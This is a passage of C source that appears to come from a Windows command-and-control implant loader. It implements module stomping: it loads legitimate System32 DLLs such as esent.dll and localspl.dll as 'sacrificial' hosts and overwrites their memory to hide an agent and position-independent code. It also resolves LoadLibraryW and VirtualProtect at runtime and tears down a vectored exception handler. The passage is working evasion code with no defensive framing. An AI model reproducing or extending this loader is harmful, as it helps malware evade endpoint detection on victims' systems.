fail_rem_veh:
    fn_rem(veh_handle);
fail_free_vst:
    set_veh_state(NULL);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, vst);
    return NULL;
}

/* ------------------------------------------------------------------ */
/* PICO and agent allocation use distinct sacrificial DLLs.           */
/* ------------------------------------------------------------------ */

static BOOL init_stomp_apis(STOMP_APIS * apis)
{
    HMODULE k32;

    k32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    if (k32 == NULL) return FALSE;

    apis->LoadLibraryW   = (FN_LoadLibraryW)   KERNEL32$GetProcAddress(k32, "LoadLibraryW");
    apis->FreeLibrary    = (FN_FreeLibrary)    KERNEL32$GetProcAddress(k32, "FreeLibrary");
    apis->VirtualProtect = (FN_VirtualProtect) KERNEL32$GetProcAddress(k32, "VirtualProtect");
    apis->CreateFileW    = (FN_CreateFileW)    KERNEL32$GetProcAddress(k32, "CreateFileW");
    apis->CloseHandle    = (FN_CloseHandle)    KERNEL32$GetProcAddress(k32, "CloseHandle");

    return apis->LoadLibraryW && apis->FreeLibrary && apis->VirtualProtect &&
           apis->CreateFileW && apis->CloseHandle;
}

BOOL stomp_alloc_pico(DWORD pico_code_sz, DWORD pico_data_sz,
                      MEMORY_LAYOUT * layout)
{
    STOMP_APIS apis;
    char * base;
    int i;
    const WCHAR * candidates[] = {
        L"C:\\Windows\\System32\\esent.dll",
        L"C:\\Windows\\System32\\xpsservices.dll",
        L"C:\\Windows\\System32\\localspl.dll",
        L"C:\\Windows\\System32\\WsmSvc.dll",
        NULL
    };

    if (!init_stomp_apis(&apis)) return FALSE;

    for (i = 0; candidates[i] != NULL; i++) {
        if (KERNEL32$GetFileAttributesW(candidates[i]) == INVALID_FILE_ATTRIBUTES)
            continue;
        base = try_stomp(&apis, candidates[i], 0,
                         pico_code_sz, pico_data_sz, layout, TRUE);
        if (base != NULL)
            return TRUE;
    }

    return FALSE;
}

PVOID stomp_alloc_dll(SIZE_T requested_size, MEMORY_LAYOUT * layout)
{
    STOMP_APIS apis;
    char * base;
    int i;
    const WCHAR * candidates[] = {
        L"C:\\Windows\\System32\\esent.dll",
        L"C:\\Windows\\System32\\xpsservices.dll",
        L"C:\\Windows\\System32\\localspl.dll",
        L"C:\\Windows\\System32\\WsmSvc.dll",
        NULL
    };

    if (!init_stomp_apis(&apis)) return NULL;

    for (i = 0; candidates[i] != NULL; i++) {
        if (KERNEL32$GetFileAttributesW(candidates[i]) == INVALID_FILE_ATTRIBUTES)
            continue;
        base = try_stomp(&apis, candidates[i], requested_size,
                         0, 0, layout, FALSE);
        if (base != NULL)
            return base;
    }

    return NULL;
}
